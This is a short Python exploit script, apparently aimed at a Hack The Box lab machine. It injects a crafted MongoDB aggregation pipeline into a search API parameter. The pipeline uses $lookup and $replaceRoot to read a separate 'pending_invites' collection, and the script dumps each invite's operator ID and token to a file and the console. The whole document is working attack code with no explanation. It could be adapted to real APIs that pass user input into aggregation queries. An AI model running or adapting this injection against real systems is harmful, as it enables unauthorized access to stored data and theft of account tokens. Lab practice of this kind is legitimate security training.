#!/usr/bin/env python3
import json
import requests
from urllib.parse import quote

BASE = "http://10.129.115.125:3000"
headers = {"Host": "aegis.korvia.htb"}

pipeline = (
    '[{"$limit":1},{"$facet":{"x":[{"$lookup":{"from":"pending_invites",'
    '"pipeline":[],"as":"y"}},{"$unwind":"$y"},'
    '{"$replaceRoot":{"newRoot":"$y"}}]}}]'
)
encoded = quote(pipeline, safe="[]{},:$")
url = f"{BASE}/api/v1/aegis-mds/search?pipeline={encoded}"
print("GET", url)
r = requests.get(url, headers=headers, timeout=60)
print("status", r.status_code, "len", len(r.text))
out = r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\invites.json"
open(out, "w", encoding="utf-8").write(r.text)
print("wrote", out)
if r.ok:
    data = r.json()
    invites = data[0]["x"] if isinstance(data, list) else data
    print("invite count:", len(invites))
    for inv in invites:
        print(inv.get("operator_id"), inv.get("token"), inv.get("redeemed"))
